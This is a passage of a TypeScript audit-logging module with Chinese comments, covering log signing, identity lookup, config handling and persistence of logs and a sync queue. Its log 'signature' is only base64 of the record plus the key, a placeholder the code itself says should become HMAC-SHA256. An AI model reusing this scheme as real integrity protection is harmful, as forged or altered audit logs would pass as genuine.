    // 简单的签名实现（生产环境应使用 HMAC-SHA256）
    const data = JSON.stringify({
      id: log.id,
      timestamp: log.timestamp,
      userId: log.userId,
      eventType: log.eventType,
      result: log.result,
    });

    return btoa(data + this.config.signatureKey);
  }

  /**
   * 验证日志签名
   * @internal 预留功能 - 用于未来验证日志完整性
   */
  // @ts-expect-error - Reserved for future cryptographic signature verification
  // eslint-disable-next-line @typescript-eslint/no-unused-vars
  private verifySignature(log: AuditLog): boolean {
    if (!this.config.enableSignature || !log.signature) {
      return true;
    }

    const expectedSignature = this.signLog(log);
    return log.signature === expectedSignature;
  }

  /**
   * 生成日志 ID
   */
  private generateLogId(): string {
    return localId("audit");
  }

  /**
   * 获取当前用户 ID
   */
  private getCurrentUserId(): string {
    // 没有登录：缺席的身份如实标记为 `unattributed`，绝不编造一个"用户"（REQ-A695）。
    return resolveAuditIdentity().userId;
  }

  /**
   * 获取当前用户名
   */
  private getCurrentUserName(): string {
    return resolveAuditIdentity().userName;
  }

  /**
   * 获取当前用户邮箱
   */
  private getCurrentUserEmail(): string | undefined {
    return resolveAuditIdentity().userEmail;
  }

  /**
   * 获取应用版本
   */
  private getAppVersion(): string {
    // 唯一真源 `AMOS_UI_VERSION`（由 version.test.ts 钉在 package.json 上）：审计记录不再持有
    // 第二份会腐烂的版本字面量（REQ-A695）。
    return currentAppVersion();
  }

  /**
   * 获取设备 ID
   */
  private getDeviceId(): string {
    const mdmConfig = mdmManager.getConfig();
    return mdmConfig?.deviceId || "device-unknown";
  }

  /**
   * 获取组织 ID
   */
  private getOrganizationId(): string {
    const mdmConfig = mdmManager.getConfig();
    return mdmConfig?.organizationId || "org-none";
  }

  /**
   * 加载配置
   */
  private loadConfig(): void {
    // 有人**显式**选过配置（`updateConfig`）时，存储不能把它改回去（REQ-A897）。
    // 这一条是自启动带来的新时序所必需的：从前装载只在 `initialize()` 那个明确
    // 时刻发生，现在第一次 `log()`/`query()` 也会触发它 —— 若此时无条件覆盖，
    // 一个「先配置、后使用」的调用者会发现自己的选择被存储里那份悄悄顶掉。
    if (this.configChosen) return;

    const raw = readStoreValue(STORE_KEYS.AUDIT_CONFIG, "");
    if (!raw) {
      this.config = DEFAULT_CONFIG;
      this.saveConfig();
      return;
    }

    try {
      this.config = { ...DEFAULT_CONFIG, ...JSON.parse(raw) };
    } catch (err) {
      console.error("[Audit] 加载配置失败:", err);
      this.config = DEFAULT_CONFIG;
    }
  }

  /**
   * 保存配置
   *
   * 写盘被拒就是**数据丢失**：内存里的 `config` 是本会话的权威，但重启后它
   * 会回到默认值。所以这里不能把 `writeStoreValueChecked` 的答案丢掉
   * （write-scan 的判据），要把损失说出来。
   */
  private saveConfig(): void {
    const serialized = JSON.stringify(this.config);
    if (!writeStoreValueChecked(STORE_KEYS.AUDIT_CONFIG, serialized)) {
      logger.error("audit", "审计配置写入被存储拒绝 —— 重启后将回落到默认配置");
    }
  }

  /**
   * 加载日志 — 解码出的值交给 {@link normalizeAuditLogs} 收口（REQ-A1511 ∕ F-SH-756）。
   */
  private loadLogs(): void {
    this.logs = normalizeAuditLogs(readStoreValue<unknown>(STORE_KEYS.AUDIT_LOGS, ""));
  }

  /**
   * 保存日志
   *
   * 审计日志"写不进去"本身就是一条该被看见的事实：内存 ring 还在，重启后会丢。
   */
  private saveLogs(): void {
    const serialized = JSON.stringify(this.logs);
    if (!writeStoreValueChecked(STORE_KEYS.AUDIT_LOGS, serialized)) {
      logger.error("audit", `审计日志写入被存储拒绝 —— ${this.logs.length} 条重启后会丢失`);
    }
  }

  /**
   * 加载同步队列
   */
  private loadSyncQueue(): void {
    const raw = readStoreValue(STORE_KEYS.AUDIT_SYNC_QUEUE, "");
    if (!raw) {
      this.syncQueue = [];
      return;
    }

    try {
      this.syncQueue = JSON.parse(raw) as string[];
    } catch (err) {
      console.error("[Audit] 加载同步队列失败:", err);
      this.syncQueue = [];
    }
  }

  /**
   * 保存同步队列
   *
   * 队列丢失 = 待同步的审计条目再也不会到达服务器，必须报出来。
   */
  private saveSyncQueue(): void {
    const serialized = JSON.stringify(this.syncQueue);
    if (!writeStoreValueChecked(STORE_KEYS.AUDIT_SYNC_QUEUE, serialized)) {
      logger.error("audit", `审计同步队列写入被存储拒绝 —— ${this.syncQueue.length} 条将不再同步`);
    }
  }

  /**
   * 获取配置
   */
  getConfig(): AuditConfig {
    return { ...this.config };
  }

  /**
   * 更新配置
   */
  updateConfig(updates: Partial<AuditConfig>): void {
    this.config = { ...this.config, ...updates };
    this.configChosen = true; // 显式选择：存储不再有权把它顶掉
    this.saveConfig();

    // 重启定时器
    if (this.flushTimer) {
      globalThis.clearInterval(this.flushTimer);
      this.startFlushTimer();
    }
    if (this.syncTimer) {
      globalThis.clearInterval(this.syncTimer);
      this.startSyncTimer();
    }
  }

  /**
   * 清除所有日志（测试用）
   */
  clearAllLogs(): void {
    this.logs = [];
    this.buffer = [];
    this.syncQueue = [];
    // 不调用存储操作，避免存储问题影响测试
    // 测试环境中只需要清除内存数据
  }
}

// ============================================================================
// 导出单例
// ============================================================================

export const auditLogger = new AuditLogger();
